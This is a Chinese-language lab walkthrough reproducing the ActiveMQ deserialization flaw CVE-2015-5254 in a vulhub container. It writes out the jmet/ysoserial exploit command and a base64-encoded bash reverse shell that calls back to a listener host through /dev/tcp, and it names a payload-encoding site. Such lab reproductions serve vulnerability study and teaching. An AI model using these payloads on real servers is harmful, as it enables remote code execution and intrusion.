# ActiveMQ 反序列化漏洞(CVE-2015-5254)

[vulhub官方复现地址](https://github.com/vulhub/vulhub/blob/master/activemq/CVE-2015-5254/README.zh-cn.md)

​           ActiveMQ: 消息中间件,在5.13.0之前≥5.0版本中存在反序列化漏洞,由于并未对用户输入的参数进行过滤以及限制,导致恶意攻击者可以构造恶意代码插入Queue中,骗取管理员执行,从而达成攻击目的. (借助Java Message Service(JMS)ObjectMessage对象执行代码)

## 漏洞搭建

​	vulhub路径: vulhub-master/activemq/CVE-2015-5254

​    docker-compose up -d

​    起的容器开了两个端口61616以及8161,分别为工作端口以及Web管理页面端口(管理员界面),两个端口相互通信.

## 复现

#### 利用工具

[jmet](https://github.com/matthiaskaiser/jmet/releases/download/0.1.0/jmet-0.1.0-all.jar),

1. 利用jmet自带的ysoserial构造payload,可执行序列化后的命令
2. 这个对象将作为一个消息发送给61616端口
3. 管理员访问页面并读取消息,执行代码,触发漏洞



在jmet.jar同文件夹下创建external文件夹,(否则可能报错文件夹不存在).

官方运行机理解释:

​	For creating gadget payloads JMET makes use of Chris Frohoffs' Ysoserial.

利用自带的ysoseerial生成payload



执行代码:

~~~bash
java -jar jmet-0.1.0-all.jar -Q event -I ActiveMQ -s -Y "touch /tmp/success" -Yp ROME your-ip 61616
~~~

在tmp目录下新建一个success文件,测试payload是否成功.

![image-20220113203843450](D:\vulnhub\ActiveMQ反序列化漏洞(CVE-2015-5254)\image-20220113203843450.png)

![image-20220113204314746](D:\vulnhub\ActiveMQ反序列化漏洞(CVE-2015-5254)\image-20220113204314746.png)

执行好后我们访问 `http://your-ip:8161/admin/browse.jsp?JMSDestination=event`这里得到ID出现在队列里,模拟一下管理员点击这个消息

![image-20220113202330557](D:\vulnhub\ActiveMQ反序列化漏洞(CVE-2015-5254)\image-20220113202330557.png)

点击之后进入详情页,此时已经成功执行我们写好的payload 也就是touch了success文件

<img src="D:\vulnhub\ActiveMQ反序列化漏洞(CVE-2015-5254)\image-20220113204626397.png" alt="image-20220113204626397" style="zoom: 67%;" />

进入容器`docker exec -it your-container-id /bin/bash`

![image-20220113210805780](D:\vulnhub\ActiveMQ反序列化漏洞(CVE-2015-5254)\image-20220113210805780.png)

可以看到success文件已经创建完成了,注意是根目录下的`/tmp/success`



## 反弹shell

1. bash回弹shell,先在kali上监听123端口,`nc -lvvp 123` 
2. 构造payload`java -jar jmet-0.1.0-all.jar -Q event -I ActiveMQ -s -Y "bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjIzMy4xMjgvMTIzIDA+JjE=}|{base64,-d}|{bash,-i}" -Yp ROME 192.168.233.128 61616`
3. 按之前的步骤访问消息即可看到回弹的shell

![image-20220113214102364](D:\vulnhub\ActiveMQ反序列化漏洞(CVE-2015-5254)\image-20220113214102364.png)



![image-20220113214214253](D:\vulnhub\ActiveMQ反序列化漏洞(CVE-2015-5254)\image-20220113214214253.png)



payload需要加密,可以用java反序列化加密`[https://www.jackson-t.ca/runtime-exec-payloads.html` 这里采用base64加密

![image-20220113214509462](D:\vulnhub\ActiveMQ反序列化漏洞(CVE-2015-5254)\image-20220113214509462.png)